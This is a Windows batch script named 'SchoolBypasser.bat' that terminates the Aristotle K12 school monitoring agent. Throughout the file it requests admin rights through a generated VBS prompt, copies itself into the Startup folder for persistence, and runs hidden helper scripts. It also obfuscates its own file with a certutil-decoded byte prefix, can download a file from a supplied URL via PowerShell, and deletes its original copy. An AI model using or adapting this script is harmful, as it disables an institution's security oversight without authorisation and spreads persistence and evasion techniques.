@echo off
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                                                                       ::
::                                                                                                       ::
::                                           System32 Bypasser                                           ::
::                                                                                                       ::
::                                                                                                       ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::







if not exist %temp%\kk.k call :SelfEncoder "false"















:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
call :CheckName
call :RunONLYONSTART
if "%~1"=="BP" goto :Release
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A >nul
cls
call :AdminCheck
:Release
set KillAri1=0
set KillAri2=0
cls
tasklist|find /i "AristotleK12CL64.exe" >nul && set KillAri1=1
if %KillAri1% equ 1  (taskkill /f /im AristotleK12CL64.exe)
tasklist|find /i "AristotleK12_BC.exe" >nul && set KillAri2=1
if %KillAri2% equ 1  (taskkill /f /im AristotleK12_BC.exe)
cls
if %KillAri1% equ 1 if %KillAri2% equ 1 echo Aristotle Was Terminated
echo Bypass Attempt Was Successful!
timeout /t 2 /nobreak >nul
exit
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::























:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                                                                       ::
::                                                                                                       ::
::                                        End of System32 Rewrite                                        ::
::                                                                                                       ::
::                                                                                                       ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:AdminCheck
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\CheckForAdmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0 BP"" %params:"=""%", "", "runas", 1 >> "%temp%\CheckForAdmin.vbs"

    "%temp%\CheckForAdmin.vbs"
    del "%temp%\CheckForAdmin.vbs"
    exit

:gotAdmin
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
exit
) else ( goto :Eof )
    pushd "%CD%"
    CD /D "%~dp0"
timeout /t 2 /nobreak >nul
goto :Eof


:RunONLYONSTART
if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
goto :eof
) else (
copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
)
goto :eof


:CheckName
if not "%~nx0"=="SchoolBypasser.bat" (
( echo if exist %cd%\SchoolBypasser.bat  del /f /q %cd%\SchoolBypasser.bat
echo timeout /t 1 /nobreak
echo ren %~nx0 "SchoolBypasser.bat"
echo timeout /t 2 /nobreak
echo start %cd%\SchoolBypasser.bat
echo del /f /im %%0%%
echo exit )>%temp%\Temp.bat
call :SilentRun "%temp%\Temp.bat" "Max"
exit
)
goto :eof

:SilentRun "FilePath" "Variable" "Variable 2" "Variable 3" "Variable 4"
echo CreateObject^(^"Wscript.Shell^"^).Run ^"^" ^& WScript.Arguments^(0^) ^& ^"^", 0, False >%temp%\Hidden.vbs
wscript.exe "%temp%\Hidden.vbs" "%~1 %~2 %~3 %~4 %~5 %~6"
del /f /im %temp%\Hidden.vbs >nul
goto :Eof



:SelfEncoder "LinkToggle"
if not "%~1"=="false" powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('%~1','%temp%\Encrypted.bat') >nul
if "%~1"=="false" copy /y %~f0 "%temp%\Encrypted.bat" /b >nul
for /f %%i in ("certutil.exe") do if not exist "%%~$path:i" (
  echo CertUtil.exe not found.
  pause
  exit /b
)
>"temp.~b64" echo(//4mY2xzDQo=
certutil.exe -f -decode "temp.~b64" "UpdatedFile.bat" >nul
del "temp.~b64" >nul
copy "UpdatedFile.bat" /b + "%temp%\Encrypted.bat" /b >nul
ren UpdatedFile.bat "EncSchoolBypasser.bat" >nul
timeout /t 2 /nobreak >nul
call :SilentRun "EncSchoolBypasser.bat"
del /f /q %temp%\Encrypted.bat >nul
echo Go Krill Yourself >%temp%\kk.k
del %0%
exit